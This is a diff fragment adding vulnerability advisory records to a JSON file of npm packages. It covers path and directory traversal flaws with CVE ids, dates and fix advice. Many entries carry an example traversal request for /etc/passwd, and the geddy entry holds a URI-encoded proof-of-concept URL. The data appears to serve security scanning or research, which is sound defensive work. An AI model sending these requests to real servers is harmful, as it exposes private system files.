+      "description": "Affected versions of `unicorn-list` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in unicorn-list",
+      "date": "2018-07-23T20:49:38Z",
+      "cve": "CVE-2017-16131",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "lab6.brit95@0.1.1",
+         "name": "lab6.brit95",
+         "version": "0.1.1"
+      },
+      "id": "GHSA-7vq3-wcjw-3fxh",
+      "description": "Affected versions of `lab6.brit95` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in lab6.brit95",
+      "date": "2018-07-23T20:48:53Z",
+      "cve": "CVE-2017-16140",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "lab6drewfusbyu@0.1.1",
+         "name": "lab6drewfusbyu",
+         "version": "0.1.1"
+      },
+      "id": "GHSA-7pgq-hhq9-9r27",
+      "description": "Affected versions of `lab6drewfusbyu` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in lab6drewfusbyu",
+      "date": "2018-07-23T20:48:38Z",
+      "cve": "CVE-2017-16141",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "commentapp.stetsonwood@0.0.1",
+         "name": "commentapp.stetsonwood",
+         "version": "0.0.1"
+      },
+      "id": "GHSA-j5mg-fpq8-vvxv",
+      "description": "Affected versions of `commentapp.stetsonwood` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in commentapp.stetsonwood",
+      "date": "2018-07-23T20:48:14Z",
+      "cve": "CVE-2017-16143",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "myserver.alexcthomas18@0.0.1",
+         "name": "myserver.alexcthomas18",
+         "version": "0.0.1"
+      },
+      "id": "GHSA-rgq8-25qc-h54q",
+      "description": "Affected versions of `myserver.alexcthomas18` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in myserver.alexcthomas18",
+      "date": "2018-07-23T20:48:05Z",
+      "cve": "CVE-2017-16144",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "sspa@0.1.0",
+         "name": "sspa",
+         "version": "0.1.0"
+      },
+      "id": "GHSA-ggq8-j54v-54x8",
+      "description": "Affected versions of `sspa` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in sspa",
+      "date": "2018-07-23T20:47:02Z",
+      "cve": "CVE-2017-16145",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "mockserve@2.0.6",
+         "name": "mockserve",
+         "version": "2.0.6"
+      },
+      "id": "GHSA-vgjp-vh3c-32v3",
+      "description": "Affected versions of `mockserve` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in mockserve",
+      "date": "2018-07-23T20:46:55Z",
+      "cve": "CVE-2017-16146",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "censorify.tanisjr@0.1.4",
+         "name": "censorify.tanisjr",
+         "version": "0.1.4"
+      },
+      "id": "GHSA-776r-w3v9-96mv",
+      "description": "Affected versions of `censorify.tanisjr` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in censorify.tanisjr",
+      "date": "2018-07-23T20:46:16Z",
+      "cve": "CVE-2017-16157",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "calmquist.static-server@0.1.1",
+         "name": "calmquist.static-server",
+         "version": "0.1.1"
+      },
+      "id": "GHSA-756f-6j3f-48q9",
+      "description": "Affected versions of `calmquist.static-server` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in calmquist.static-server",
+      "date": "2018-07-23T20:45:51Z",
+      "cve": "CVE-2017-16165",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "byucslabsix@0.0.5",
+         "name": "byucslabsix",
+         "version": "0.0.5"
+      },
+      "id": "GHSA-hhff-3c89-5m7p",
+      "description": "Affected versions of `byucslabsix` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in byucslabsix",
+      "date": "2018-07-23T20:45:42Z",
+      "cve": "CVE-2017-16166",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "utahcityfinder@0.0.1",
+         "name": "utahcityfinder",
+         "version": "0.0.1"
+      },
+      "id": "GHSA-68cm-mgv7-vg5c",
+      "description": "Affected versions of `utahcityfinder` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in utahcityfinder",
+      "date": "2018-07-23T20:45:11Z",
+      "cve": "CVE-2017-16173",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "ewgaddis.lab6@0.1.1",
+         "name": "ewgaddis.lab6",
+         "version": "0.1.1"
+      },
+      "id": "GHSA-5x5w-v4xq-p64r",
+      "description": "Affected versions of `ewgaddis.lab6` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in ewgaddis.lab6",
+      "date": "2018-07-23T20:44:52Z",
+      "cve": "CVE-2017-16175",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "reecerver@0.1.2",
+         "name": "reecerver",
+         "version": "0.1.2"
+      },
+      "id": "GHSA-f7jg-mcvw-9gwv",
+      "description": "Affected versions of `reecerver` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in reecerver",
+      "date": "2018-07-23T20:40:40Z",
+      "cve": "CVE-2017-16188",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "sly07@0.1.2",
+         "name": "sly07",
+         "version": "0.1.2"
+      },
+      "id": "GHSA-rw6j-rhw7-q94c",
+      "description": "Affected versions of `sly07` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in sly07",
+      "date": "2018-07-23T20:40:34Z",
+      "cve": "CVE-2017-16189",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "getcityapi.yoehoehne@0.0.1",
+         "name": "getcityapi.yoehoehne",
+         "version": "0.0.1"
+      },
+      "id": "GHSA-4vcm-qfxh-p6c3",
+      "description": "Affected versions of `getcityapi.yoehoehne` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in getcityapi.yoehoehne",
+      "date": "2018-07-23T20:40:29Z",
+      "cve": "CVE-2017-16192",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "picard@0.3.1",
+         "name": "picard",
+         "version": "0.3.1"
+      },
+      "id": "GHSA-x5x2-mfc7-r22f",
+      "description": "Affected versions of `picard` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in picard",
+      "date": "2018-07-23T20:40:20Z",
+      "cve": "CVE-2017-16194",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "quickserver@1.1.0",
+         "name": "quickserver",
+         "version": "1.1.0"
+      },
+      "id": "GHSA-78h7-fgq9-625x",
+      "description": "Affected versions of `quickserver` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in quickserver",
+      "date": "2018-07-23T20:40:14Z",
+      "cve": "CVE-2017-16196",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "dgard8.lab6@0.0.1",
+         "name": "dgard8.lab6",
+         "version": "0.0.1"
+      },
+      "id": "GHSA-xqfm-ff6g-24c7",
+      "description": "Affected versions of `dgard8.lab6` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in dgard8.lab6",
+      "date": "2018-07-23T20:39:44Z",
+      "cve": "CVE-2017-16218",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "resolve-path@1.3.3",
+         "name": "resolve-path",
+         "version": "1.3.3"
+      },
+      "id": "GHSA-62g9-6hw5-rwfp",
+      "description": "Versions of `resolve-path` before 1.4.0 are vulnerable to path traversal. `resolve-path` relative path resolving suffers from a lack of file path sanitization for windows based paths.\n\n\n## Recommendation\n\nUpdate to version 1.4.0 or later.",
+      "summary": "Path Traversal in resolve-path",
+      "date": "2018-07-18T21:20:25Z",
+      "cve": "CVE-2018-3732",
+      "year": 2018
+   },
+   {
+      "package": {
+         "raw": "next@3.2.3",
+         "name": "next",
+         "version": "3.2.3"
+      },
+      "id": "GHSA-m34x-wgrh-g897",
+      "description": "Next.js 4 before 4.2.3 has Directory Traversal under the `/_next` request namespace.",
+      "summary": "Directory traversal vulnerability in Next.js",
+      "date": "2018-01-24T19:38:52Z",
+      "cve": "CVE-2018-6184",
+      "year": 2018
+   },
+   {
+      "package": {
+         "raw": "next@2.4.0",
+         "name": "next",
+         "version": "2.4.0"
+      },
+      "id": "GHSA-3f5c-4qxj-vmpf",
+      "description": "Next.js before 2.4.1 has directory traversal under the `/_next` and `/static` request namespace, allowing attackers to obtain sensitive information.",
+      "summary": "Next.js Directory Traversal Vulnerability",
+      "date": "2017-12-05T02:04:14Z",
+      "cve": "CVE-2017-16877",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "send@0.8.3",
+         "name": "send",
+         "version": "0.8.3"
+      },
+      "id": "GHSA-xwg4-93c6-3h42",
+      "description": "Versions 0.8.3 and earlier of `send` are affected by a directory traversal vulnerability. When relying on the root option to restrict file access it may be possible for an application consumer to escape out of the restricted directory and access files in a similarly named directory. \n\nFor example, `static(_dirname + '/public')` would allow access to `_dirname + '/public-restricted'`.\n\n\n## Recommendation\n\nUpdate to version 0.8.4 or later.",
+      "summary": "Directory Traversal in send",
+      "date": "2017-10-24T18:33:36Z",
+      "cve": "CVE-2014-6394",
+      "year": 2014
+   },
+   {
+      "package": {
+         "raw": "geddy@13.0.7",
+         "name": "geddy",
+         "version": "13.0.7"
+      },
+      "id": "GHSA-333x-9vgq-v2j4",
+      "description": "Versions 13.0.8 and earlier of geddy are vulnerable to a directory traversal attack via URI encoded attack vectors.\n\n### Proof of Concept\n```\nhttp://localhost:4000/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd\n```\n\n\n## Recommendation\n\nUpdate geddy to version >= 13.0.8",
+      "summary": "Directory Traversal in geddy",
+      "date": "2017-10-24T18:33:36Z",
+      "cve": "CVE-2015-5688",
+      "year": 2015
+   },
+   {
+      "package": {
+         "raw": "yarn@1.21.1",
+         "name": "yarn",
+         "version": "1.21.1"
+      },
+      "id": "GHSA-5xf4-f2fq-f69j",
+      "description": "In Yarn before 1.21.1, the package install functionality can be abused to generate arbitrary symlinks on the host filesystem by using specially crafted \"bin\" keys. Existing files could be overwritten depending on the current user permission set.",
+      "summary": "Yarn Improper link resolution before file access (Link Following)",
+      "date": "2020-02-14T23:10:16Z",
+      "cve": "CVE-2019-10773",
+      "year": 2019
+   },
+   {
+      "package": {
+         "raw": "flowise-ui@2.0.7",
+         "name": "flowise-ui",
+         "version": "2.0.7"
+      },
+      "id": "SNYK-JS-FLOWISEUI-9459045",
+      "description": "flowise-ui is a \nAffected versions of this package are vulnerable to Arbitrary Code Injection via the /api/v1/document-store/loader/process API. An attacker can execute arbitrary code by manipulating the fileName parameter to traverse directories and overwrite critical files such as package.json, leading to remote code execution when the server is started.\nNote:\nThe writing functions addBase64FilesToStorage, addArrayFilesToStorage and addSingleFileToStorage in packages/components/src/storageUtils.ts are vulnerable.\n",
+      "summary": "Arbitrary Code Injection  Affecting flowise-ui package, versions <2.1.0",
+      "date": "14 Mar 2025",
+      "year": 2025
+   },
+   {
+      "package": {
+         "raw": "flowise@2.0.7",
+         "name": "flowise",
+         "version": "2.0.7"
+      },
+      "id": "SNYK-JS-FLOWISE-9459046",
+      "description": "flowise is a Flowiseai Server\nAffected versions of this package are vulnerable to Arbitrary Code Injection via the /api/v1/document-store/loader/process API. An attacker can execute arbitrary code by manipulating the fileName parameter to traverse directories and overwrite critical files such as package.json, leading to remote code execution when the server is started.\nNote:\nThe writing functions addBase64FilesToStorage, addArrayFilesToStorage and addSingleFileToStorage in packages/components/src/storageUtils.ts are vulnerable.\n",
+      "summary": "Arbitrary Code Injection  Affecting flowise package, versions <2.1.0",
+      "date": "14 Mar 2025",
+      "year": 2025
+   },
+   {
+      "package": {
+         "raw": "@graphql-mesh/http@0.3.18",
+         "name": "http",
+         "version": "0.3.18",
+         "scope": "graphql-mesh"
+      },
+      "id": "SNYK-JS-GRAPHQLMESHHTTP-8744682",
+      "description": "Affected versions of this package are vulnerable to Directory Traversal due to insufficient path validation in the staticFiles HTTP handler. This is because when the staticFiles option is configured in the .meshrc.yml file, the server's static file handler does not adequately verify that the requested file paths are confined within the designated static files directory.\n",
+      "summary": "Directory Traversal  Affecting @graphql-mesh/http package, versions <0.3.19",
+      "date": "20 Feb 2025",
+      "cve": "CVE-2025-27098",
+      "year": 2025
+   },
+   {
+      "package": {
+         "raw": "evershop@1.0.0-beta",
+         "name": "evershop",
+         "version": "1.0.0-beta"
+      },
+      "id": "SNYK-JS-EVERSHOP-6117626",
+      "description": "evershop is an A shopping cart platform with Express, React and MySQL\nAffected versions of this package are vulnerable to Directory Traversal via a crafted request to the mkdirSync function in the folderCreate/createFolder.js endpoint. An attacker can obtain sensitive information by sending a specially crafted request.\n",
+      "summary": "Directory Traversal  Affecting evershop package, versions *",
+      "date": "8 Dec 2023",
+      "cve": "CVE-2023-46497",
+      "year": 2023
+   },
+   {
+      "package": {
+         "raw": "@simonsmith/cypress-image-snapshot@8.0.1",
+         "name": "cypress-image-snapshot",
+         "version": "8.0.1",
+         "scope": "simonsmith"
+      },
+      "id": "SNYK-JS-SIMONSMITHCYPRESSIMAGESNAPSHOT-5813755",
+      "description": "@simonsmith/cypress-image-snapshot is a Cypress Image Snapshot binds jest-image-snapshot's image diffing logic to Cypress.io commands.\nAffected versions of this package are vulnerable to Directory Traversal. It's possible for a user to pass a relative file path for the snapshot name and reach outside of the project directory into the machine running the test.\n",
+      "summary": "Directory Traversal  Affecting @simonsmith/cypress-image-snapshot package, versions <8.0.2",
+      "date": "1 Aug 2023",
+      "cve": "CVE-2023-38695",
+      "year": 2023
+   },
+   {
+      "package": {
+         "raw": "node-libcurl@4.1.0",
+         "name": "node-libcurl",
+         "version": "4.1.0"
+      },
+      "id": "SNYK-JS-NODELIBCURL-5933252",
+      "description": "Affected versions of this package are vulnerable to External Control of File Name or Path via the curl_easy_duphandle function, allowing an attacker to insert cookies into a running program using this library.\nWhen this function is used to duplicate an easy handle with cookies enabled, the cookie-enable state is also cloned. However, the actual cookies are not cloned, and if the source handle did not read any cookies from a specific file on disk, the cloned handle would store the file name as none. Subsequent use of the cloned handle that does not explicitly set a source to load cookies from would inadvertently load cookies from a file named none. \nNote:\nThis is only exploitable if a file named none exists and is readable in the current directory of the program using libcurl and in the correct file format.\nChangelog:\n2023-10-04: Initial publication\n2023-10-11: Published updated information, including CWE, CVSS, official references and affected versions range.\n",
+      "summary": "External Control of File Name or Path  Affecting node-libcurl package, versions *",
+      "date": "5 Oct 2023",
+      "cve": "CVE-2023-38546",
+      "year": 2023
+   },
+   {
+      "package": {
+         "raw": "nocodb@0.109.5",
+         "name": "nocodb",
+         "version": "0.109.5"
+      },
+      "id": "SNYK-JS-NOCODB-5721466",
+      "description": "nocodb is a NocoDB\nAffected versions of this package are vulnerable to Directory Traversal allowing an unauthenticated attacker to access arbitrary files on the server by manipulating the path parameter of the /download route. This vulnerability could allow an attacker to access sensitive files and data on the server, including configuration files, source code, and other sensitive information.\n",
+      "summary": "Directory Traversal  Affecting nocodb package, versions <0.109.6",
+      "date": "20 Jun 2023",
+      "cve": "CVE-2023-35843",
+      "year": 2023
+   },
+   {
+      "package": {
+         "raw": "gatsby-plugin-sharp@5.9.0",
+         "name": "gatsby-plugin-sharp",
+         "version": "5.9.0"
+      },
+      "id": "SNYK-JS-GATSBYPLUGINSHARP-5671648",
+      "description": "gatsby-plugin-sharp is a low-level helper plugin generally used by other Gatsby plugins that exposes several image processing functions built on the Sharp image processing library.\nAffected versions of this package are vulnerable to Information Exposure via local file inclusion in __file-code-frame or __original-stack-frame, when gatsby develop is in use and exposed to the internet.\nNOTE: By default gatsby develop is only accessible via the localhost 127.0.0.1, and one would need to intentionally expose the server to other interfaces to exploit this vulnerability by using server options such as --host 0.0.0.0, -H 0.0.0.0, or the GATSBY_HOST=0.0.0.0 environment variable.\n",
+      "summary": "Information Exposure  Affecting gatsby-plugin-sharp package, versions <5.10.0",
+      "date": "8 Jun 2023",
+      "cve": "CVE-2023-34238",
+      "year": 2023
+   },
+   {
+      "package": {
+         "raw": "wrangler@2.21.3",
+         "name": "wrangler",
+         "version": "2.21.3"
+      },
+      "id": "SNYK-JS-WRANGLER-5819554",
+      "description": "wrangler is a Command-line interface for all things Cloudflare Workers\nAffected versions of this package are vulnerable to Directory Traversal when running a local development server for Pages (wrangler pages dev command). This vulnerability enabled an attacker in the same network as the victim to connect to the local development server and access the victim's files present outside of the directory for the development server.\n",
+      "summary": "Directory Traversal  Affecting wrangler package, versions <3.1.1",
+      "date": "3 Aug 2023",
+      "cve": "CVE-2023-3348",
+      "year": 2023
+   }
+]
